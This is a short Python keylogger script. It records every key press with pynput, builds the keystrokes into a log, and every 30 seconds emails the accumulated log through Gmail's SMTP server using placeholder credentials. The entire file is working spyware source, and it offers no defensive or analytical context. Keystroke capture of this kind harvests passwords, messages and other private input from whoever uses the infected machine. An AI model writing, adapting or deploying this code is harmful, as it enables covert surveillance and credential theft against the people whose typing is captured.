import threading
import pynput.keyboard
import smtplib
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError :
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        print("Unknown Character")
    print(log)

#def send_email():
    #email_server = smtplib.SMTP("smtp.gmail.com",587)
    #email_server.starttls()
    #email_server.login("PLEASE YOUR EMAİL ","PLEASE YOUR PASSWORD")
    #email_server.sendmail("PLEASE YOUR EMAİL","PLEASE YOUR EMAİL","Test Message")
    #email_server.quit()

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("PLEASE YOUR EMAİL","PLEASE YOUR PASSWORD",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()



with keylogger_listener:
    thread_function()
    keylogger_listener.join()


